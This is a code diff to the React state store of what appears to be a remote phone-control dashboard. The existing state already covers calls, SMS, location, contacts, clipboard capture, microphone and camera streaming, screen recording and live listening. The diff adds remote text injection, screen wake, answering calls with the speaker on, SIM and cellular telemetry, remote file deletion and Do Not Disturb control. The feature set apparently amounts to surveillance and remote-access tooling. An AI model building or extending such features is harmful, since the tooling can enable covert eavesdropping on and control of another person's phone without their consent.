@@ -54,6 +54,11 @@ export function StoreProvider({ children }) {
   const [lostModeState, setLostModeState] = useState({});
   const [galleryPhotos, setGalleryPhotos] = useState({});
   const [galleryLoading, setGalleryLoading] = useState(false);
+  const [cellularInfo, setCellularInfo] = useState({});
+  const [dndStatus, setDndStatus] = useState({});
+  const [strobeActive, setStrobeActive] = useState(false);
+  const [junkScanData, setJunkScanData] = useState({});
+  const [isScanningJunk, setIsScanningJunk] = useState(false);
   const ws = useRef(null);
   const alertTimers = useRef({});
   // Mirrors files.downloadBuffer for the stray-terminator guard below
@@ -499,6 +504,75 @@ function titleOrApp(appName, title, text) {
           break;
         }
 
+        case 'INPUT_TEXT_RESULT': {
+          if (p.success) {
+            pushToast(`Injected text: "${p.text}"`, 'success');
+          } else {
+            pushToast(`Text injection failed: ${p.error || 'No focused field'}`, 'error');
+          }
+          break;
+        }
+
+        case 'SCREEN_WAKE_RESULT': {
+          pushToast(p.success ? 'Screen wake signal sent to phone' : `Screen wake failed: ${p.error}`, p.success ? 'success' : 'error');
+          break;
+        }
+
+        case 'CALL_ACTION_RESULT': {
+          pushToast(p.success ? `Call ${p.action === 'answer' ? 'answered (Speaker ON)' : 'declined'}` : `Call action failed: ${p.error}`, p.success ? 'success' : 'error');
+          if (p.success) dismissAlert();
+          break;
+        }
+
+        case 'CELLULAR_INFO_RESPONSE': {
+          if (p.deviceId) {
+            setCellularInfo((prev) => ({ ...prev, [p.deviceId]: p }));
+          }
+          break;
+        }
+
+        case 'TORCH_STROBE_RESULT': {
+          if (typeof p.strobeActive === 'boolean') setStrobeActive(p.strobeActive);
+          pushToast(p.strobeActive ? '⚡ SOS Strobe Beacon ACTIVATED' : 'Strobe Beacon turned OFF', p.strobeActive ? 'warning' : 'info');
+          break;
+        }
+
+        case 'JUNK_SCAN_RESPONSE': {
+          setIsScanningJunk(false);
+          if (p.deviceId) {
+            setJunkScanData((prev) => ({ ...prev, [p.deviceId]: p }));
+          }
+          if (p.success) {
+            pushToast(`Junk scan complete: ${( (p.totalJunkBytes || 0) / (1024 * 1024) ).toFixed(1)} MB found`, 'info');
+          } else {
+            pushToast(`Junk scan failed: ${p.error}`, 'error');
+          }
+          break;
+        }
+
+        case 'JUNK_CLEAN_RESULT': {
+          if (p.success) {
+            pushToast(`Cleaned ${p.deletedCount || 0} files (${((p.freedBytes || 0) / (1024 * 1024)).toFixed(1)} MB freed)`, 'success');
+            if (activeDeviceId) sendCommand('junk-scan', { deviceId: activeDeviceId });
+          } else {
+            pushToast(`Clean failed: ${p.error}`, 'error');
+          }
+          break;
+        }
+
+        case 'DND_STATUS_RESPONSE':
+        case 'DND_SET_RESULT': {
+          if (p.deviceId) {
+            setDndStatus((prev) => ({ ...prev, [p.deviceId]: p }));
+          }
+          if (p.appliedMode) {
+            pushToast(`DND mode set to: ${p.appliedMode}`, 'success');
+          } else if (p.error) {
+            pushToast(`DND: ${p.error}`, 'error');
+          }
+          break;
+        }
+
         default:
           break;
       }
@@ -589,8 +663,18 @@ function titleOrApp(appName, title, text) {
       .then((r) => r.json())
       .then((b) => { if (b) setCallBlocklist((prev) => ({ ...prev, [activeDeviceId]: b })); })
       .catch(() => {});
+    fetch(`/api/devices/${activeDeviceId}/cellular`)
+      .then((r) => r.json())
+      .then((info) => { if (info) setCellularInfo((prev) => ({ ...prev, [activeDeviceId]: info })); })
+      .catch(() => {});
+    fetch(`/api/devices/${activeDeviceId}/dnd`)
+      .then((r) => r.json())
+      .then((d) => { if (d) setDndStatus((prev) => ({ ...prev, [activeDeviceId]: d })); })
+      .catch(() => {});
     sendCommand('volume-get', { deviceId: activeDeviceId }).catch(() => {});
     sendCommand('battery-stats', { deviceId: activeDeviceId }).catch(() => {});
+    sendCommand('cellular-info', { deviceId: activeDeviceId }).catch(() => {});
+    sendCommand('dnd-get', { deviceId: activeDeviceId }).catch(() => {});
   }, [activeDeviceId, sendCommand]);
 
   const value = useMemo(
@@ -717,6 +801,31 @@ function titleOrApp(appName, title, text) {
         }
         return sendCommand('input-swipe', { deviceId: activeDeviceId, x1, y1, x2, y2, duration });
       },
+      // Remote Keyboard Typing Injection
+      sendInputText: (text) => sendCommand('input-text', { deviceId: activeDeviceId, text }),
+      // Remote Screen Wake
+      wakeScreen: () => sendCommand('screen-wake', { deviceId: activeDeviceId }),
+      // Call Actions (Answer / Decline)
+      answerCall: (speaker = true) => sendCommand('call-action', { deviceId: activeDeviceId, action: 'answer', speaker }),
+      declineCall: () => sendCommand('call-action', { deviceId: activeDeviceId, action: 'decline' }),
+      // Cellular & Dual-SIM Telemetry
+      cellularInfo: activeDeviceId ? cellularInfo[activeDeviceId] : null,
+      fetchCellularInfo: () => sendCommand('cellular-info', { deviceId: activeDeviceId }),
+      // Torch SOS Strobe
+      strobeActive,
+      toggleTorchStrobe: (enabled, speedMs = 150, durationSec = 30) => sendCommand('torch-strobe', { deviceId: activeDeviceId, enabled, speedMs, durationSec }),
+      // Storage & Junk Cleaner
+      junkScanData: activeDeviceId ? junkScanData[activeDeviceId] : null,
+      isScanningJunk,
+      scanJunk: () => {
+        setIsScanningJunk(true);
+        sendCommand('junk-scan', { deviceId: activeDeviceId });
+      },
+      cleanJunk: (categoryId, paths) => sendCommand('junk-clean', { deviceId: activeDeviceId, categoryId, paths }),
+      // Do Not Disturb (DND)
+      dndStatus: activeDeviceId ? dndStatus[activeDeviceId] : null,
+      fetchDndStatus: () => sendCommand('dnd-get', { deviceId: activeDeviceId }),
+      setDndMode: (mode) => sendCommand('dnd-set', { deviceId: activeDeviceId, mode }),
       // Volume & Sound Manager
       volumeInfo: activeDeviceId ? volumeInfo[activeDeviceId] : null,
       fetchVolumeInfo: () => sendCommand('volume-get', { deviceId: activeDeviceId }),
@@ -762,7 +871,7 @@ function titleOrApp(appName, title, text) {
         return false;
       }
     }),
-    [devices, activeDeviceId, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading]
+    [devices, activeDeviceId, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading, cellularInfo, dndStatus, strobeActive, junkScanData, isScanningJunk]
   );
 
   return <StoreContext.Provider value={value}>{children}</StoreContext.Provider>;
